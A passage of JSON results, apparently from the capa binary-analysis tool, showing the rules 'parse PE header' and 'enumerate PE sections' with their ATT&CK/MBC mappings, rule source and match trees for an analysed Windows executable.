            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "TlsGetValue"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651806642
                    }
                  ],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "parse PE header": {
        "meta": {
          "name": "parse PE header",
          "namespace": "load-code/pe",
          "authors": [
            "moritz.raabe@mandiant.com"
          ],
          "scopes": {
            "static": "function"
          },
          "attack": [
            {
              "parts": [
                "Execution",
                "Shared Modules"
              ],
              "tactic": "Execution",
              "technique": "Shared Modules",
              "subtechnique": "",
              "id": "T1129"
            }
          ],
          "mbc": [],
          "references": [],
          "examples": [
            "9324D1A8AE37A36AE560C37448C9705A:0x403DD0"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: parse PE header\r\n    namespace: load-code/pe\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n    scopes:\r\n      static: function\r\n      dynamic: unsupported  # requires mnemonic, operand[1].offset features\r\n    att&ck:\r\n      - Execution::Shared Modules [T1129]\r\n    examples:\r\n      - 9324D1A8AE37A36AE560C37448C9705A:0x403DD0\r\n  features:\r\n    - and:\r\n      - os: windows\r\n      - and:\r\n        - mnemonic: cmp\r\n        - or:\r\n          - number: 0x4550 = IMAGE_NT_SIGNATURE (PE)\r\n          - and:\r\n            - number: 0x50\r\n            - number: 0x45\r\n        - or:\r\n          - number: 0x5A4D = IMAGE_DOS_SIGNATURE (MZ)\r\n          - and:\r\n            - number: 0x4D\r\n            - number: 0x5A\r\n        - optional:\r\n          - and:\r\n            - operand[1].offset: 0x3C = IMAGE_DOS_HEADER.e_lfanew\r\n            - or:\r\n              - and:\r\n                - arch: i386\r\n                - operand[1].offset: 0x50 = IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage\r\n                - operand[1].offset: 0x34 = IMAGE_NT_HEADERS.OptionalHeader.ImageBase\r\n              - and:\r\n                - arch: amd64\r\n                - operand[1].offset: 0x50 = IMAGE_NT_HEADERS64.OptionalHeader.SizeOfImage\r\n                - operand[1].offset: 0x30 = IMAGE_NT_HEADERS64.OptionalHeader.ImageBase\r\n          - basic block:\r\n            - and:\r\n              - operand[1].offset: 0x3C = IMAGE_DOS_HEADER.e_lfanew\r\n              - 3 or more:\r\n                - operand[1].offset: 0x4 = IMAGE_NT_HEADERS.FileHeader.Machine\r\n                - operand[1].offset: 0x6 = IMAGE_NT_HEADERS.FileHeader.NumberOfSections\r\n                - operand[1].offset: 0x14 = IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader\r\n                - operand[1].offset: 0x16 = IMAGE_NT_HEADERS.FileHeader.Characteristics\r\n                - operand[1].offset: 0x28 = IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint  # for 32 and 64 bit\r\n                - or:\r\n                  - and:\r\n                    - arch: i386\r\n                    - operand[1].offset: 0x34 = IMAGE_NT_HEADERS.OptionalHeader.ImageBase\r\n                    - operand[1].offset: 0x50 = IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage\r\n                  - and:\r\n                    - arch: amd64\r\n                    - operand[1].offset: 0x30 = IMAGE_NT_HEADERS.OptionalHeader.ImageBase\r\n                    - operand[1].offset: 0x50 = IMAGE_NT_HEADERS64.OptionalHeader.SizeOfImage\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 1651807232
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "mnemonic",
                          "mnemonic": "cmp"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651807232
                        },
                        {
                          "type": "absolute",
                          "value": 1651807210
                        },
                        {
                          "type": "absolute",
                          "value": 1651807220
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "number",
                              "number": 17744,
                              "description": "IMAGE_NT_SIGNATURE (PE)"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 1651807210
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 80
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 69
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "number",
                              "number": 23117,
                              "description": "IMAGE_DOS_SIGNATURE (MZ)"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 1651807232
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 77
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 90
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "optional"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "operand offset",
                                  "index": 1,
                                  "operand_offset": 60,
                                  "description": "IMAGE_DOS_HEADER.e_lfanew"
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651807200
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "or"
                                }
                              },
                              "children": [
                                {
                                  "success": false,
                                  "node": {
                                    "type": "statement",
                                    "statement": {
                                      "type": "and"
                                    }
                                  },
                                  "children": [
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "arch",
                                          "arch": "i386"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "operand offset",
                                          "index": 1,
                                          "operand_offset": 80,
                                          "description": "IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "operand offset",
                                          "index": 1,
                                          "operand_offset": 52,
                                          "description": "IMAGE_NT_HEADERS.OptionalHeader.ImageBase"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    }
                                  ],
                                  "locations": [],
                                  "captures": {}
                                },
                                {
                                  "success": false,
                                  "node": {
                                    "type": "statement",
                                    "statement": {
                                      "type": "and"
                                    }
                                  },
                                  "children": [
                                    {
                                      "success": true,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "arch",
                                          "arch": "amd64"
                                        }
                                      },
                                      "children": [],
                                      "locations": [
                                        {
                                          "type": "no address"
                                        }
                                      ],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "operand offset",
                                          "index": 1,
                                          "operand_offset": 80,
                                          "description": "IMAGE_NT_HEADERS64.OptionalHeader.SizeOfImage"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "operand offset",
                                          "index": 1,
                                          "operand_offset": 48,
                                          "description": "IMAGE_NT_HEADERS64.OptionalHeader.ImageBase"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    }
                                  ],
                                  "locations": [],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "match",
                              "match": "parse PE header/3a0d016707f44fa5b41262f634a21c96"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "enumerate PE sections": {
        "meta": {
          "name": "enumerate PE sections",
          "namespace": "load-code/pe",
          "authors": [
            "@Ana06",
            "@mr-tz"
          ],
          "scopes": {
            "static": "function"
          },
          "attack": [],
          "mbc": [
            {
              "parts": [
                "Discovery",
                "Code Discovery",
                "Enumerate PE Sections"
              ],
              "objective": "Discovery",
              "behavior": "Code Discovery",
              "method": "Enumerate PE Sections",
              "id": "B0046.001"
            }
          ],
          "references": [
            "https://0x00sec.org/t/reflective-dll-injection/3080",
            "https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection"
          ],
          "examples": [
            "E4C33AC3638EEF68311F8AC0D72483C7:0x401510"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: enumerate PE sections\r\n    namespace: load-code/pe\r\n    authors:\r\n      - \"@Ana06\"\r\n      - \"@mr-tz\"\r\n    scopes:\r\n      static: function\r\n      dynamic: unsupported  # requires offset, operand[1].offset, characteristic, mnemonic, basicblock features\r\n    mbc:\r\n      - Discovery::Code Discovery::Enumerate PE Sections [B0046.001]\r\n    references:\r\n      - https://0x00sec.org/t/reflective-dll-injection/3080\r\n      - https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection\r\n    examples:\r\n      - E4C33AC3638EEF68311F8AC0D72483C7:0x401510\r\n  features:\r\n    - and:\r\n      - os: windows\r\n      # there should be some complexity to functions like this\r\n      - count(basic blocks): 3 or more\r\n      - optional:\r\n        - offset: 0x3C = IMAGE_DOS_HEADER.e_lfanew\r\n      - instruction:\r\n        - or:\r\n          - mnemonic: mov\r\n          - mnemonic: movzx\r\n        - operand[1].offset: 0x6 = IMAGE_NT_HEADERS.FileHeader.NumberOfSections\r\n      - basic block:\r\n        - or:\r\n          - and:\r\n            - description: IMAGE_FIRST_SECTION(nt_header)\r\n            - instruction:\r\n              - or:\r\n                - mnemonic: add\r\n                - mnemonic: mov\r\n                - mnemonic: movzx\r\n              - operand[1].offset: 0x14 = IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader\r\n            - operand[1].offset: 0x18 = FileHeader.SizeOfOptionalHeader\r\n          - and:\r\n            - description: (DWORD)dll_raw + dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS) + sizeof(IMAGE_SECTION_HEADER) * i\r\n            - number: 0x28 = sizeof(IMAGE_SECTION_HEADER)\r\n            - or:\r\n              - and:\r\n                - arch: i386\r\n                - operand[1].offset: 0xF8 = sizeof(IMAGE_NT_HEADERS32)\r\n              - and:\r\n                - arch: amd64\r\n                - operand[1].offset: 0x108 = sizeof(IMAGE_NT_HEADERS64)\r\n      - 2 or more:\r\n        - operand[1].offset: 0xC = IMAGE_SECTION_HEADER.VirtualAddress\r\n        - operand[1].offset: 0x14 = IMAGE_SECTION_HEADER.PointerToRawData\r\n        - operand[1].offset: 0x10 = IMAGE_SECTION_HEADER.SizeOfRawData\r\n        # there's also offset 0x8 = IMAGE_SECTION_HEADER.Misc.PhysicalAddress, but it's likely too common\r\n      - not:\r\n        # non-zeroing XOR was observed in FPs\r\n        - characteristic: nzxor\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 1651807264
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "subscope",
                      "scope": "instruction"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "and"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "operand offset",
                              "index": 1,
                              "operand_offset": 6,
                              "description": "IMAGE_NT_HEADERS.FileHeader.NumberOfSections"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 1651807280
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "or"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "mnemonic",
                                  "mnemonic": "mov"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "mnemonic",
                                  "mnemonic": "movzx"
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651807280
                                }
                              ],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651807280
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "subscope",
                      "scope": "basic block"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and",
                              "description": "IMAGE_FIRST_SECTION(nt_header)"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "subscope",
                                  "scope": "instruction"
                                }
                              },
                              "children": [
                                {
                                  "success": true,
                                  "node": {
                                    "type": "statement",
                                    "statement": {
                                      "type": "and"
                                    }
                                  },
                                  "children": [
                                    {
                                      "success": true,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "operand offset",
                                          "index": 1,
                                          "operand_offset": 20,
                                          "description": "IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader"
                                        }
                                      },
                                      "children": [],
                                      "locations": [
                                        {
                                          "type": "absolute",
                                          "value": 1651807271
                                        }
                                      ],
                                      "captures": {}
                                    },
                                    {
                                      "success": true,
                                      "node": {
                                        "type": "statement",
                                        "statement": {
                                          "type": "or"
                                        }
                                      },
                                      "children": [
                                        {
                                          "success": false,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "mnemonic",
                                              "mnemonic": "add"
                                            }
                                          },
                                          "children": [],
                                          "locations": [],
                                          "captures": {}
                                        },
                                        {
                                          "success": false,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "mnemonic",
                                              "mnemonic": "mov"
                                            }
                                          },
                                          "children": [],
                                          "locations": [],
                                          "captures": {}
                                        },
                                        {
                                          "success": true,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "mnemonic",
                                              "mnemonic": "movzx"
                                            }
                                          },
                                          "children": [],
                                          "locations": [
                                            {
                                              "type": "absolute",
                                              "value": 1651807271
                                            }
                                          ],
                                          "captures": {}
                                        }
                                      ],
                                      "locations": [],
                                      "captures": {}
                                    }
                                  ],
                                  "locations": [],
                                  "captures": {}
                                }
                              ],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651807271
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "operand offset",
                                  "index": 1,
                                  "operand_offset": 24,
                                  "description": "FileHeader.SizeOfOptionalHeader"
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651807275
                                }
                              ],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and",
                              "description": "(DWORD)dll_raw + dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS) + sizeof(IMAGE_SECTION_HEADER) * i"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 40,
                                  "description": "sizeof(IMAGE_SECTION_HEADER)"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "or"
                                }
                              },
                              "children": [
                                {
                                  "success": false,
                                  "node": {
                                    "type": "statement",
                                    "statement": {
                                      "type": "and"
                                    }
                                  },
                                  "children": [
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "arch",
                                          "arch": "i386"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "operand offset",
                                          "index": 1,
                                          "operand_offset": 248,
                                          "description": "sizeof(IMAGE_NT_HEADERS32)"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    }
                                  ],
                                  "locations": [],
                                  "captures": {}
                                },
                                {
                                  "success": false,
                                  "node": {
                                    "type": "statement",
                                    "statement": {
                                      "type": "and"
                                    }
                                  },
                                  "children": [
                                    {
                                      "success": true,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "arch",
                                          "arch": "amd64"
                                        }
                                      },
                                      "children": [],
                                      "locations": [
                                        {
                                          "type": "no address"
                                        }
                                      ],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "operand offset",
                                          "index": 1,
                                          "operand_offset": 264,
                                          "description": "sizeof(IMAGE_NT_HEADERS64)"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    }
                                  ],
                                  "locations": [],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651807264
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "range",
                      "min": 3,
                      "max": 9223372036854775808,
                      "child": {
                        "type": "basic block"
                      }
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651807264
                    },
                    {
                      "type": "absolute",
                      "value": 1651807316
                    },
                    {
                      "type": "absolute",
                      "value": 1651807333
                    },
                    {
                      "type": "absolute",
                      "value": 1651807335
                    },
                    {
                      "type": "absolute",
                      "value": 1651807288
                    },
                    {
                      "type": "absolute",
                      "value": 1651807304
                    },
                    {
                      "type": "absolute",
                      "value": 1651807324
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "optional"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "offset",
                          "offset": 60,
                          "description": "IMAGE_DOS_HEADER.e_lfanew"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651807264
                        }
                      ],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "not"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "characteristic",
                          "characteristic": "nzxor"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "some",
                      "count": 2
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "operand offset",
                          "index": 1,
                          "operand_offset": 12,
                          "description": "IMAGE_SECTION_HEADER.VirtualAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651807304
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "operand offset",
                          "index": 1,
                          "operand_offset": 20,
                          "description": "IMAGE_SECTION_HEADER.PointerToRawData"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651807271
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "operand offset",
                          "index": 1,
                          "operand_offset": 16,
                          "description": "IMAGE_SECTION_HEADER.SizeOfRawData"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651807504
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "subscope",
                      "scope": "instruction"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "and"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "operand offset",
                              "index": 1,
                              "operand_offset": 6,
                              "description": "IMAGE_NT_HEADERS.FileHeader.NumberOfSections"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 1651807564
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "or"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "mnemonic",
                                  "mnemonic": "mov"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "mnemonic",
                                  "mnemonic": "movzx"
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651807564
                                }
                              ],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651807564
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "subscope",
                      "scope": "basic block"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and",
                              "description": "IMAGE_FIRST_SECTION(nt_header)"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "subscope",
                                  "scope": "instruction"
                                }
                              },
                              "children": [
                                {
                                  "success": true,
                                  "node": {
                                    "type": "statement",
                                    "statement": {
                                      "type": "and"
                                    }
                                  },
                                  "children": [
                                    {
                                      "success": true,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "operand offset",
                                          "index": 1,
                                          "operand_offset": 20,
                                          "description": "IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader"
                                        }
                                      },
                                      "children": [],
                                      "locations": [
                                        {
                                          "type": "absolute",
                                          "value": 1651807554
                                        }
                                      ],
                                      "captures": {}
                                    },
                                    {
                                      "success": true,
                                      "node": {
                                        "type": "statement",
                                        "statement": {
                                          "type": "or"
                                        }
                                      },
                                      "children": [
                                        {
                                          "success": false,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "mnemonic",
                                              "mnemonic": "add"
                                            }
                                          },
                                          "children": [],
                                          "locations": [],
                                          "captures": {}
                                        },
                                        {
                                          "success": false,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "mnemonic",
                                              "mnemonic": "mov"
                                            }
                                          },
                                          "children": [],
                                          "locations": [],
                                          "captures": {}
                                        },
                                        {
                                          "success": true,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "mnemonic",
                                              "mnemonic": "movzx"
                                            }
                                          },
                                          "children": [],
                                          "locations": [
                                            {
                                              "type": "absolute",
                                              "value": 1651807554
                                            }
                                          ],
                                          "captures": {}
                                        }
                                      ],
                                      "locations": [],
                                      "captures": {}
                                    }
                                  ],
                                  "locations": [],
                                  "captures": {}
                                }
                              ],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651807554
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "operand offset",
                                  "index": 1,
                                  "operand_offset": 24,
                                  "description": "FileHeader.SizeOfOptionalHeader"
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651807559
                                }
                              ],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and",
                              "description": "(DWORD)dll_raw + dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS) + sizeof(IMAGE_SECTION_HEADER) * i"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 40,
                                  "description": "sizeof(IMAGE_SECTION_HEADER)"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "or"
                                }
                              },
                              "children": [
                                {
                                  "success": false,
                                  "node": {
                                    "type": "statement",
                                    "statement": {
                                      "type": "and"
                                    }
                                  },
                                  "children": [
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "arch",
                                          "arch": "i386"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "operand offset",
                                          "index": 1,
                                          "operand_offset": 248,
                                          "description": "sizeof(IMAGE_NT_HEADERS32)"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    }
                                  ],
                                  "locations": [],
                                  "captures": {}
                                },
                                {
                                  "success": false,
                                  "node": {
                                    "type": "statement",
                                    "statement": {
                                      "type": "and"
                                    }
                                  },
                                  "children": [
                                    {
                                      "success": true,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "arch",
                                          "arch": "amd64"
                                        }
                                      },
                                      "children": [],
                                      "locations": [
                                        {
                                          "type": "no address"
                                        }
                                      ],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "operand offset",
                                          "index": 1,
                                          "operand_offset": 264,
                                          "description": "sizeof(IMAGE_NT_HEADERS64)"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    }
                                  ],
                                  "locations": [],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651807541
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
